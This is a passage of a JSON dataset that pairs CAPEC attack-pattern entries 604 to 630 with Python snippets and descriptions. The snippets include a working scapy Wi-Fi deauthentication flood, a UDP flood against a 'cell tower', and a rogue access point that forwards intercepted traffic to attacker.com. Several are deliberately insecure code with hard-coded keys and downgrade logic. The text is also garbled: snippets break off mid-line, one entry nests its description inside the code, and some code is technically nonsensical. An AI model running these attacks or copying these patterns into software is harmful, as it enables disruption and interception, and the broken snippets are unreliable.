        "description": "This code demonstrates a vulnerable resource management system that allows unlimited allocation of resources without any throttling or size restrictions. It also includes a mechanism to deliberately block access to critical resources through an infinite loop. The code can lead to resource exhaustion through unbounded memory allocation and denial of service through resource blocking."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import scapy.all as scapy\nimport time\n\ndef deauth_attack(target_ap, target_client):\n    # Create a deauthentication frame\n    deauth_frame = scapy.RadioTap() / \\\n                  scapy.Dot11(addr1=target_client,\n                           addr2=target_ap,\n                           addr3=target_ap) / \\\n                  scapy.Dot11Deauth()\n    \n    # Continuously send deauth frames\n    while True:\n        try:\n            scapy.sendp(deauth_frame, iface='wlan0mon', count=100, inter=0.1)\n            # No verification of message integrity or source\n            time.sleep(1)\n        except KeyboardInterrupt:\n            break\n\n# Example usage\ntarget_ap = 'AA:BB:CC:DD:EE:FF'      # Target AP MAC\ntarget_client = 'FF:EE:DD:CC:BB:AA'   # Target client MAC\ndeauth_attack(target_ap, target_client)",
        "description": "This code demonstrates a Wi-Fi deauthentication attack where unauthenticated deauth frames are continuously sent to disconnect clients from a target access point. The code exploits multiple vulnerabilities including lack of message integrity verification (CWE-924), improper channel endpoint verification (CWE-923), and no source verification (CWE-940). The attack disrupts legitimate communication by flooding the channel with malicious frames."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import random\nimport socket\n\ndef jamming_attack():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    target_tower = ('cell_tower.net', 443)\n    \n    # Generate high-power noise signals\n    while True:\n        # Create random noise data without encryption\n        noise_data = bytes([random.randint(0, 255) for _ in range(1024)])\n        \n        # Flood the channel with unauthenticated messages\n        for _ in range(1000):\n            # Send without verifying channel integrity or encryption\n            sock.sendto(noise_data, target_tower)\n            \n            # Send fake status messages\n            fake_status = b'STATUS_UPDATE:' + noise_data\n            sock.sendto(fake_status, target_tower)\n            \n            # Inject signals on control channels\n            control_msg = b'CONTROL:' + noise_data\n            sock.sendto(control_msg, target_tower)",
        "description": "This code demonstrates a cellular jamming attack by creating a socket connection and continuously flooding a cell tower with high-power noise signals, fake status messages, and control channel interference. The code exhibits multiple vulnerabilities: transmitting sensitive data in cleartext, lack of message integrity verification, no authentication of communication endpoints, and exploiting physical side channels through signal interference."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "\"\"\"\nimport socket\nimport ssl\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\nclass InsecureBaseStation:\n    def __init__(self):\n        self.encryption_key = b'hardcoded_key123'  # Hard-coded key\n        self.supported_algorithms = ['A5/0', 'A5/1', 'A5/2']  # Weak algorithms\n        \n    def negotiate_encryption(self, client_algorithms):\n        # Always choose weakest encryption\n        for algo in self.supported_algorithms:\n            if algo in client_algorithms:\n                return algo\n        return 'A5/0'  # Default to no encryption\n\n    def encrypt_data(self, data, algorithm):\n        if algorithm == 'A5/0':\n            return data  # No encryption\n        elif algorithm in ['A5/1', 'A5/2']:\n            # Using weak DES encryption\n            cipher = Cipher(algorithms.DES(self.encryption_key),\n                          modes.ECB(),\n                          backend=default_backend())\n            encryptor = cipher.encryptor()\n            return encryptor.update(data) + encryptor.finalize()\n\n    def establish_connection(self, client):\n        client_algos = client.get_supported_algorithms()\n        chosen_algo = self.negotiate_encryption(client_algos)\n        \n        # No integrity checking implemented\n        encrypted_data = self.encrypt_data(b'sensitive_data', chosen_algo)\n        return encrypted_data\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities including algorithm downgrade, weak encryption, hard-coded cryptographic keys, lack of message integrity checks, and use of broken cryptographic algorithms. The base station deliberately chooses the weakest available encryption method, uses hard-coded keys, and implements weak encryption algorithms (DES in ECB mode). It also lacks any message integrity verification.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities including algorithm downgrade, weak encryption, hard-coded cryptographic keys, lack of message integrity checks, and use of broken cryptographic algorithms. The base station deliberately chooses the weakest available encryption method, uses hard-coded keys, and implements weak encryption algorithms (DES in ECB mode). It also lacks any message integrity verification.\""
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "\"\"\"\nimport threading\nimport time\n\nclass SystemComponent:\n    def __init__(self, name):\n        self.name = name\n        self.active = True\n        self.connection = None\n        self._lock = threading.Lock()\n        \n    def connect(self, other_component):\n        self.connection = other_component\n        \n    def process_message(self, message):\n        # Race condition in message processing\n        if not self._lock.acquire(blocking=False):\n            return\n        \n        try:\n            if self.active and self.connection:\n                time.sleep(0.1)  # Vulnerable delay creating timing window\n                if self.active:  # Second check without proper synchronization\n                    return f\"Processed: {message",
        "description": "\"This vulnerable code demonstrates system component interaction issues including race conditions in message processing, lack of proper component isolation, inadequate error handling, and insufficient protection against component disruption. The code allows unauthorized component manipulation and contains timing vulnerabilities that could lead to system degradation.\""
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "class MobileCommunication:\n    def __init__(self):\n        self.encryption_key = b'0123456789abcdef'  # Hard-coded key (CWE-321)\n        self.supported_algorithms = ['A5/1', 'A5/2', 'AES']  # Including weak algorithms\n\n    def negotiate_encryption(self, client_algorithms):\n        # Vulnerable algorithm negotiation (CWE-757)\n        # Always selects the weakest common algorithm\n        for algo in ['A5/2', 'A5/1', 'AES']:\n            if algo in client_algorithms:\n                return algo\n\n    def encrypt_communication(self, data, algorithm):\n        if algorithm in ['A5/1', 'A5/2']:\n            # Using weak GSM encryption (CWE-327)\n            return self._weak_encrypt(data)\n        return self._strong_encrypt(data)\n\n    def _weak_encrypt(self, data):\n        # Implementing weak A5/1 or A5/2 encryption\n        from itertools import cycle\n        return bytes(a ^ b for a, b in zip(data.encode(), cycle(self.encryption_key)))\n\n    def _strong_encrypt(self, data):\n        from cryptography.fernet import Fernet\n        f = Fernet(self.encryption_key)\n        return f.encrypt(data.encode())",
        "description": "This code demonstrates vulnerable mobile communication encryption implementation, including hard-coded keys, weak algorithm selection (A5/1 and A5/2), and vulnerable algorithm negotiation that can be exploited through downgrade attacks. The implementation allows for the use of known weak GSM encryption algorithms and doesn't properly protect against algorithm downgrade attacks, making it susceptible to cryptanalytic attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "class MobileDataTransmitter:\n    def __init__(self):\n        self.api_key = '1234567890'\n        self.user_data = {}\n    \n    def send_sensitive_data(self, phone_number, location, credit_card):\n        # Sending data without encryption or verification\n        payload = f'number={phone_number}&location={location}&cc={credit_card}'\n        \n        # Using unencrypted HTTP connection\n        url = f'http://api.mobiledata.com/send?data={payload}&key={self.api_key}'\n        \n        import urllib.request\n        request = urllib.request.Request(url)\n        response = urllib.request.urlopen(request)\n        \n        # Broadcasting data using implicit intent (Android)\n        from android.content import Intent\n        intent = Intent()\n        intent.setAction('com.app.SEND_DATA')\n        intent.putExtra('sensitive_data', payload)\n        context.sendBroadcast(intent)\n        \n        return response.read()",
        "description": "This code demonstrates several vulnerabilities in mobile data transmission: sending sensitive data (phone number, location, credit card) over unencrypted HTTP, lack of source verification, no message integrity checks, cleartext transmission of sensitive data, and using implicit intents for sensitive communication. The code makes no attempt to encrypt the payload, verify the communication channel, or implement any security measures to prevent interception."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "class MobileDataTransmitter:\n    def __init__(self):\n        self.debug_mode = True\n        self.test_data = {'pin': '1234', 'account': '987654321'}\n    \n    def send_sensitive_data(self, data, destination):\n        # Debug mode can be activated at runtime\n        if self.debug_mode:\n            print(f'Debug: {data}')\n        \n        # Transmit data without encryption\n        message = f'USER_DATA:{data}'\n        \n        # No message integrity check\n        for _ in range(3):  # Send multiple copies without volume control\n            self.transmit(message, destination)\n    \n    def transmit(self, message, destination):\n        # Cleartext transmission with sensitive data\n        payload = {\n            'message': message,\n            'debug_info': self.test_data,\n            'destination': destination\n        }\n        # Simulate network transmission\n        return payload\n\n# Usage\ntransmitter = MobileDataTransmitter()\ntransmitter.send_sensitive_data('confidential_info', '192.168.1.1')",
        "description": "This vulnerable code demonstrates mobile data transmission with multiple security flaws: debug/test logic that can be activated at runtime, cleartext transmission of sensitive information, lack of message integrity checks, inclusion of sensitive debug data in transmissions, and potential for network amplification through multiple retransmissions."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "\"\"\"\nimport socket\nimport random\nimport dns.resolver\n\ndef generate_bitsquat_domains(domain):\n    base_domain = domain.split('.')[0]\n    tld = domain.split('.')[1]\n    bitsquat_domains = []\n    \n    for i in range(len(base_domain)):\n        char = ord(base_domain[i])\n        for bit in range(8):\n            flipped = char ^ (1 << bit)\n            if 32 < flipped < 127:\n                squat = base_domain[:i] + chr(flipped) + base_domain[i+1:]\n                bitsquat_domains.append(f'{squat",
        "description": "\"This code implements a BitSquatting attack by generating domain names that differ by single bit flips from a target domain. It includes a malicious DNS server setup that can intercept and redirect traffic to attacker-controlled servers. The code exploits memory bit errors and DNS resolution to redirect users to malicious domains that are visually similar to legitimate ones.\""
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "\"\"\"\nimport scapy.all as scapy\nimport time\nimport json\n\nclass WifiTracker:\n    def __init__(self):\n        self.mac_database = {",
        "description": "\"A vulnerable WiFi tracking system that captures MAC addresses and stores sensitive tracking information without proper access controls or encryption. The code demonstrates insecure storage of MAC-to-user mappings, exposed tracking data, and unprotected communication channels.\""
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "\"\"\"\nimport scapy.all as scapy\nimport time\n\nclass WiFiTracker:\n    def __init__(self):\n        self.ssid_history = {",
        "description": "\"This vulnerable code demonstrates passive WiFi tracking by collecting and storing SSID information from WiFi management frames. It stores sensitive SSID data without encryption, doesn't verify the authenticity of captured packets, and allows tracking of specific SSIDs. The code exposes user location privacy through WiFi management frame monitoring and stores the correlation between SSIDs and timing/location data.\""
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "\"\"\"\nimport cryptography\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nimport binascii\n\nclass SIMCardOTAUpdate:\n    def __init__(self):\n        # Using weak DES encryption (CWE-327, CWE-326)\n        self.des_key = b'weakkey1'\n        \n    def create_malicious_update(self, payload):\n        # Create encrypted SMS with weak DES\n        cipher = Cipher(algorithms.DES(self.des_key), modes.ECB())\n        encryptor = cipher.encryptor()\n        \n        # Format payload as Java applet binary\n        java_applet = f\\\"\\\"\\\"\n        package malicious;\n        public class SIMApplet extends javacard.framework.Applet {{\n            public void process() {{\n                // Malicious operations\n                sendSMS('{payload",
        "description": "\"This code demonstrates a vulnerable implementation of SIM card OTA updates using weak DES encryption and insufficient security controls. It allows creation of malicious Java applets that can be delivered via binary SMS messages, exploiting weak cryptography and debug interfaces. The code includes ability to send unauthorized SMS, modify voicemail settings, and access location data without proper authentication.\""
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\nimport threading\n\nclass RogueWiFiAP:\n    def __init__(self, ssid='Free_WiFi', host='0.0.0.0', port=80):\n        self.ssid = ssid\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.bind((host, port))\n\n    def start(self):\n        self.server.listen(5)\n        while True:\n            client, addr = self.server.accept()\n            # No authentication or verification of client identity\n            client_handler = threading.Thread(target=self.handle_client, args=(client,))\n            client_handler.start()\n\n    def handle_client(self, client_socket):\n        while True:\n            try:\n                # Receive data in cleartext without encryption\n                data = client_socket.recv(1024).decode()\n                if not data:\n                    break\n                # No message integrity checks\n                # Forward data without verifying source\n                self.forward_traffic(data)\n            except:\n                break\n        client_socket.close()\n\n    def forward_traffic(self, data):\n        # Forward intercepted traffic to attacker's server\n        attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        attacker_socket.connect(('attacker.com', 8080))\n        attacker_socket.send(data.encode())\n        attacker_socket.close()\n\nrogue_ap = RogueWiFiAP()\nrogue_ap.start()",
        "description": "This code creates a rogue WiFi access point that accepts client connections without proper authentication, transmits data in cleartext, lacks message integrity checks, and forwards intercepted traffic to an attacker's server. It embodies vulnerabilities related to unsecured communication channels, improper endpoint verification, and cleartext transmission of sensitive data."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\nimport shutil\n\ndef download_resource(resource_name, save_path):\n    # Simulated download function that doesn't validate source\n    base_url = 'http://trusted-looking-but-malicious.com/resources/'\n    download_path = os.path.join(save_path, resource_name)\n    \n    # Search for resource in multiple locations without proper validation\n    search_paths = [\n        './resources/',\n        '/tmp/resources/',\n        base_url,\n        os.getenv('RESOURCE_PATH', '')\n    ]\n    \n    for path in search_paths:\n        try:\n            # Blindly trust the resource location\n            resource_path = os.path.join(path, resource_name)\n            if os.path.exists(resource_path):\n                shutil.copy(resource_path, download_path)\n                return download_path\n            elif path.startswith('http'):\n                # Simulate downloading from potentially malicious URL\n                with open(download_path, 'w') as f:\n                    f.write('Malicious content')\n                return download_path\n        except:\n            continue\n    \n    return None\n\n# Usage\nsensitive_file = download_resource('config.json', '/app/config/')",
        "description": "This vulnerable code demonstrates resource location spoofing by implementing a resource download function that searches for files in multiple locations without proper validation of the source. It blindly trusts external paths and URLs, potentially allowing an attacker to place malicious resources in one of the search locations. The code leaks sensitive information by copying resources to new locations without access control and fails to verify the authenticity of the resource source."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\nclass CellularBaseStation:\n    def __init__(self, station_id, signal_strength=100):\n        self.station_id = station_id\n        self.signal_strength = signal_strength\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n    def start_broadcast(self):\n        self.sock.bind(('0.0.0.0', 5555))\n        self.sock.listen(5)\n        \n        while True:\n            client, addr = self.sock.accept()\n            # No verification of client identity\n            # No channel encryption or integrity checks\n            threading.Thread(target=self.handle_client, args=(client,)).start()\n            \n    def handle_client(self, client):\n        # Accept any device without authentication\n        client.send(f\"Connected to Base Station {self.station_id",
        "description": "\"This code simulates a vulnerable cellular base station implementation that lacks proper authentication, channel verification, and message integrity checks. It accepts any incoming connection without verifying the client's identity, doesn't implement encryption, and processes all received data without validation. The high signal_strength parameter ensures devices preferentially connect to this rogue station over legitimate ones.\""
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "class CellularTracker:\n    def __init__(self):\n        self.target_phone = '+1234567890'\n        self.current_lac = 'LAC123'\n    \n    def send_broadcast_message(self):\n        broadcast_msg = {\n            'type': 'alert',\n            'target_msisdn': self.target_phone,\n            'message': 'network_query',\n            'lac': self.current_lac\n        }\n        \n        # Send broadcast without proper authentication\n        self.network_send(broadcast_msg)\n    \n    def network_send(self, message):\n        # Vulnerable: No encryption or message integrity checks\n        connection = self.connect_to_cell_network()\n        connection.send(str(message))\n    \n    def listen_for_response(self):\n        # Vulnerable: Accepts any response without verification\n        connection = self.connect_to_cell_network()\n        response = connection.receive()\n        return 'target_present' in response\n    \n    def track_target_location(self):\n        self.send_broadcast_message()\n        is_present = self.listen_for_response()\n        return {'location': self.current_lac if is_present else 'Not Found'}\n    \n    def connect_to_cell_network(self):\n        # Vulnerable: No endpoint verification\n        return NetworkConnection(self.current_lac)",
        "description": "This code demonstrates a vulnerable implementation of cellular network tracking that allows an attacker to determine a target's location by sending broadcast messages and monitoring responses. It contains multiple vulnerabilities including lack of message integrity checks, improper authentication, exposure of sensitive information (phone number and location), and insufficient verification of communication endpoints."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import socket\nimport time\nimport signal\nimport threading\nfrom scapy.all import *\n\nclass WiFiLocator:\n    def __init__(self):\n        self.signal_strength = {}\n        self.mac_target = '00:11:22:33:44:55'\n        self.location_data = []\n\n    def monitor_wifi(self):\n        def packet_handler(pkt):\n            if pkt.haslayer(Dot11):\n                if pkt.addr2 == self.mac_target:\n                    # Store signal strength without encryption\n                    self.signal_strength[time.time()] = pkt.dBm_AntSignal\n                    # Send location data without verification\n                    self.send_location_data(pkt.dBm_AntSignal)\n\n    def send_location_data(self, signal_strength):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = ('monitoring_server', 12345)\n        try:\n            sock.connect(server_address)\n            # Sending sensitive data without encryption\n            data = f'MAC:{self.mac_target},SIGNAL:{signal_strength}'\n            sock.sendall(data.encode())\n        finally:\n            sock.close()\n\n    def calculate_location(self):\n        # Signal handler not properly protected\n        signal.signal(signal.SIGINT, self.signal_handler)\n        while True:\n            if len(self.signal_strength) >= 3:\n                # Process triangulation without verification\n                location = self.triangulate()\n                self.location_data.append(location)\n\n    def signal_handler(self, signum, frame):\n        # Vulnerable signal handler sharing state\n        self.process_sensitive_data()\n\n    def start_monitoring(self):\n        sniff_thread = threading.Thread(target=self.monitor_wifi)\n        calc_thread = threading.Thread(target=self.calculate_location)\n        sniff_thread.start()\n        calc_thread.start()",
        "description": "This code demonstrates a WiFi signal monitoring system that tracks a specific MAC address and calculates its location based on signal strength. The code contains multiple vulnerabilities: it transmits sensitive MAC address and signal strength data without encryption, lacks proper verification of communication channels, uses unprotected signal handlers during sensitive operations, and doesn't implement proper message integrity checks during data transmission. The signal strength data is collected and processed without adequate protection against physical side-channel attacks."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "class CryptoNegotiator:\n    def __init__(self):\n        self.supported_ciphers = {\n            'AES-256': 256,\n            'AES-128': 128,\n            'DES': 56,\n            'NULL': 0\n        }\n        self.encryption_key = 'hardcoded_secret_key123'\n\n    def negotiate_encryption(self, client_ciphers):\n        # Always accept client's minimum cipher even if stronger ones are available\n        min_cipher = min(client_ciphers, key=lambda x: self.supported_ciphers[x])\n        return min_cipher\n\n    def encrypt_data(self, data, cipher):\n        if cipher == 'NULL':\n            return data  # No encryption\n        # Weak encryption implementation\n        return {\n            'algorithm': cipher,\n            'data': data,\n            'key': self.encryption_key\n        }\n\n# Usage\nnegotiator = CryptoNegotiator()\nclient_ciphers = ['AES-128', 'DES', 'NULL']\nselected_cipher = negotiator.negotiate_encryption(client_ciphers)\nsensitive_data = 'secret_password123'\nencrypted = negotiator.encrypt_data(sensitive_data, selected_cipher)",
        "description": "This code demonstrates multiple encryption vulnerabilities including algorithm downgrade, hard-coded cryptographic keys, and potential cleartext storage. The negotiation protocol always selects the weakest cipher available, allowing an attacker to force NULL encryption. It uses a hard-coded encryption key and may store sensitive data in cleartext if NULL encryption is negotiated."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import time\n\ndef send_sensitive_message(message, recipient):\n    for char in message:\n        # Timing-based encoding of sensitive data\n        if char == '1':\n            time.sleep(0.1)  # longer delay for '1'\n        else:\n            time.sleep(0.05)  # shorter delay for '0'\n        \n        # Send encrypted dummy packet to mask actual data\n        encrypted_packet = encrypt_dummy_data()\n        send_packet(encrypted_packet, recipient)\n\ndef process_payment(credit_card, amount):\n    # Vulnerable timing behavior reveals success/failure\n    if validate_card(credit_card):\n        time.sleep(2)  # Processing delay for valid cards\n        process_transaction(amount)\n    else:\n        time.sleep(0.5)  # Different delay for invalid cards\n        raise ValidationError()\n\ndef encrypt_dummy_data():\n    return b'encrypted_data'\n\ndef send_packet(data, recipient):\n    # Network transmission simulation\n    pass",
        "description": "This code demonstrates multiple timing-based vulnerabilities. The send_sensitive_message function implements a covert timing channel by varying packet transmission delays to encode binary data, even though the actual packets are encrypted. The process_payment function exhibits observable timing discrepancies that leak information about credit card validity through different processing delays. Both functions allow metadata analysis and timing-based side-channel attacks, even when the transmitted data itself is encrypted."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import subprocess\nimport time\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\ndef encrypt_sensitive_data(key, data):\n    # Unprotected AES encryption implementation that's vulnerable to side-channel analysis\n    while True:\n        cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\n        encryptor = cipher.encryptor()\n        \n        # Deliberate power consumption pattern during encryption\n        time.sleep(0.1)  # Artificial delay creating observable timing patterns\n        encrypted = encryptor.update(data) + encryptor.finalize()\n        \n        # CPU-intensive operation that creates electromagnetic emissions\n        subprocess.run(['openssl', 'speed', 'aes-256-ecb'])\n        \n        return encrypted\n\n# Example usage with sensitive data\nkey = b'\\x00' * 32  # Weak static key\nsensitive_data = b'SECRET_PASSWORD_123'\nencrypted_data = encrypt_sensitive_data(key, sensitive_data)",
        "description": "This code demonstrates an implementation vulnerable to electromagnetic side-channel attacks. It uses a weak static key, performs unprotected AES encryption with artificial timing delays, and includes CPU-intensive operations that generate distinctive electromagnetic emissions. The code also lacks physical security controls and proper channel protection, making it susceptible to EME analysis."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "\"\"\"\nimport time\nimport numpy as np\nfrom cryptography.fernet import Fernet\n\nclass SensitiveDevice:\n    def __init__(self):\n        self.key = Fernet.generate_key()\n        self.cipher = Fernet(self.key)\n        self.alert_enabled = True\n        self.power_consumption = []\n    \n    def process_sensitive_data(self, data):\n        # Vulnerable: Processing creates measurable power fluctuations\n        for byte in data:\n            # Each operation creates distinctive power pattern\n            result = byte * 2\n            time.sleep(0.01)  # Creates timing pattern\n            self.power_consumption.append(result)\n            \n            # Vulnerable: Acoustic emission through CPU fan\n            if result > 128:\n                # CPU intensive operation causing fan speed change\n                np.array([x * x for x in range(1000)])\n        \n        # Vulnerable: Error messages leak information\n        if len(data) > 100:\n            print(f\"Processing large data block: {len(data)",
        "description": "\"This code demonstrates various side-channel vulnerabilities including power analysis (through measurable power consumption patterns), acoustic emissions (through CPU operations affecting fan speed), electromagnetic emissions (during encryption operations), and information leakage through error messages. The code processes sensitive data in a way that makes it susceptible to physical side-channel attacks and compromising emanations.\""
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "class CryptoDevice:\n    def __init__(self):\n        self.secret_key = b'super_secret_key_123'\n        self.voltage_level = 3.3\n        self.clock_speed = 100\n        self.temperature = 25\n\n    def perform_crypto_operation(self, data):\n        # No voltage or temperature checks before critical operations\n        if self.clock_speed > 0:  # Naive clock check\n            try:\n                # Vulnerable to glitch attacks during key usage\n                result = bytearray()\n                for i in range(len(data)):\n                    result.append(data[i] ^ self.secret_key[i % len(self.secret_key)])\n                return result\n            except Exception:\n                # No proper error handling for fault conditions\n                return self.secret_key  # Leaks key on error\n\n    def adjust_clock(self, new_speed):\n        # No restrictions on clock manipulation\n        self.clock_speed = new_speed\n\n    def set_voltage(self, new_voltage):\n        # No protection against voltage manipulation\n        self.voltage_level = new_voltage\n\n    def set_temperature(self, new_temp):\n        # No thermal protection or monitoring\n        self.temperature = new_temp",
        "description": "This code represents a vulnerable cryptographic device implementation that lacks proper protection against physical fault injection attacks. The code is susceptible to voltage glitching, clock manipulation, and temperature-based attacks. It has no proper error handling for fault conditions, no protection against instruction skips, and can leak sensitive information when operating in extreme conditions. The device allows direct software control of hardware parameters without proper restrictions and lacks proper sensor implementations for detecting fault injection attempts."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "class CryptoDevice:\n    def __init__(self):\n        self.secret_key = b'SuperSecretKey123'\n        self.voltage_level = 3.3\n        self.clock_frequency = 1000000\n        self.temperature = 25.0\n\n    def perform_encryption(self, data):\n        # Vulnerable: No checks for voltage glitches or temperature anomalies\n        if self.clock_frequency > 0:  # Basic check that can be bypassed\n            result = b''\n            for i, byte in enumerate(data):\n                # No protection against instruction skips or EM interference\n                result += bytes([byte ^ self.secret_key[i % len(self.secret_key)]])\n            return result\n\n    def set_operating_parameters(self, voltage, clock, temp):\n        # Vulnerable: Direct control of hardware parameters without validation\n        self.voltage_level = voltage\n        self.clock_frequency = clock\n        self.temperature = temp\n\n# Usage example that's vulnerable to fault injection\ndevice = CryptoDevice()\ndevice.set_operating_parameters(2.5, 800000, -20)  # Can manipulate hardware conditions\nencrypted = device.perform_encryption(b'SensitiveData')",
        "description": "This code simulates a vulnerable cryptographic device that lacks proper protections against various fault injection attacks. It allows direct manipulation of voltage, clock, and temperature parameters without proper validation or sensors. The encryption operation has no safeguards against instruction skips, electromagnetic interference, or cold boot attacks. The device continues operation even under abnormal conditions that could compromise security."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "class TouchscreenPinEntry:\n    def __init__(self):\n        self.pin_pattern = []\n        self.screen_state = [[0 for _ in range(3)] for _ in range(4)]\n        \n    def enter_pin(self, coordinates):\n        # No cleaning of touch surface between attempts\n        # Each touch accumulates oil residue\n        for x, y in coordinates:\n            self.screen_state[y][x] += 1\n            self.pin_pattern.append((x, y))\n            \n    def verify_pin(self, entered_pattern):\n        # Vulnerable because residue analysis can reveal pattern\n        # No mitigation against smudge attacks\n        return self.pin_pattern == entered_pattern\n    \n    def get_screen_state(self):\n        # Represents accumulated finger smudges\n        # Higher values indicate more frequent touches\n        return self.screen_state",
        "description": "A vulnerable touchscreen PIN entry implementation that does not protect against smudge attacks. The code tracks touch coordinates and accumulates usage patterns without cleaning or randomization, making it susceptible to physical observation of finger smudges to reveal the PIN pattern."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "\"\"\"\nimport gps\nfrom datetime import datetime\n\nclass GPSReceiver:\n    def __init__(self):\n        self.position = None\n        self.timestamp = None\n        \n    def process_gps_signal(self, signal_data):\n        # Vulnerable: No verification of GPS signal source\n        # Vulnerable: No integrity checking of received data\n        try:\n            latitude = float(signal_data['lat'])\n            longitude = float(signal_data['lon'])\n            time = signal_data['time']\n            \n            # Vulnerable: Blindly accepts and stores received position\n            self.position = (latitude, longitude)\n            self.timestamp = datetime.strptime(time, '%Y-%m-%d %H:%M:%S')\n            \n            # Vulnerable: No replay protection\n            return self.calculate_position()\n            \n        except Exception as e:\n            return None\n    \n    def calculate_position(self):\n        # Vulnerable: Truncates precision of coordinates\n        if self.position:\n            return {\n                'latitude': round(self.position[0], 4),\n                'longitude': round(self.position[1], 4),\n                'timestamp': self.timestamp.strftime('%Y-%m-%d %H:%M:%S')",
        "description": "\"This vulnerable GPS receiver implementation accepts and processes GPS signals without verifying their authenticity or integrity. It lacks source verification, signal validation, and anti-replay protection, making it susceptible to GPS spoofing attacks. The code also truncates position data, which could mask malicious modifications.\""
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "class GPSReceiver:\n    def __init__(self):\n        self.current_location = (0, 0)\n        self.signal_source = None\n    \n    def receive_gps_signal(self, signal_data, signal_power, source):\n        # Vulnerable: No verification of signal authenticity\n        if signal_power > 0:\n            # Accepts any GPS signal without validating source\n            self.signal_source = source\n            self.current_location = signal_data\n            return True\n        return False\n\n    def get_location(self):\n        # No integrity check on location data\n        return self.current_location\n\ndef navigate_vehicle():\n    gps = GPSReceiver()\n    while True:\n        # Vulnerable: No authentication of incoming signals\n        signal = receive_satellite_signal()\n        location = signal['coordinates']\n        power = signal['power']\n        source = signal['satellite_id'][:8]  # Truncates source identifier\n        \n        if gps.receive_gps_signal(location, power, source):\n            # Blindly trusts received coordinates\n            update_navigation(gps.get_location())",
        "description": "A vulnerable GPS receiver implementation that demonstrates susceptibility to GPS spoofing attacks. The code lacks proper signal authentication, truncates source identifiers, and fails to verify signal integrity or source legitimacy. It accepts any incoming GPS signal based solely on signal power, making it vulnerable to carry-off attacks where an attacker can gradually inject false coordinates."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "class ResourceManager:\n    def __init__(self):\n        self.resources = {}\n        self.power_usage = 0\n\n    def allocate_resource(self, name):\n        # CWE-67: No validation of Windows device names\n        # CWE-863: Missing proper authorization\n        self.resources[name] = open(name, 'w+')\n        self.power_usage += 100\n\n    def use_resource(self, name):\n        # CWE-920: No power consumption limits\n        while True:\n            self.power_usage += 50\n            self.resources[name].write('data')\n\n    # CWE-772: Resource leak - no proper cleanup\n    def cleanup(self):\n        pass  # Missing resource cleanup implementation",
        "description": "A vulnerable resource management system that demonstrates multiple weaknesses: failure to release system resources, unrestricted power consumption, lack of input validation for Windows device names, and missing authorization checks. The code allows unbounded resource allocation without proper cleanup, potentially leading to resource exhaustion and system instability."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "from flask import Flask, redirect, request\n\ndef is_valid_domain(domain):\n    trusted_domain = 'mybank.com'\n    # Weak comparison that can be fooled by similar-looking domains\n    return domain.lower().replace('1', 'l').replace('0', 'o') == trusted_domain\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef redirect_to_site():\n    target_url = request.args.get('url', '')\n    \n    # Vulnerable domain validation\n    domain = target_url.split('/')[2] if '//' in target_url else target_url.split('/')[0]\n    \n    # No proper sanitization of URL characters\n    # Accepts potentially malicious redirects\n    if is_valid_domain(domain):\n        return redirect(target_url)\n    \n    return 'Invalid redirect'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
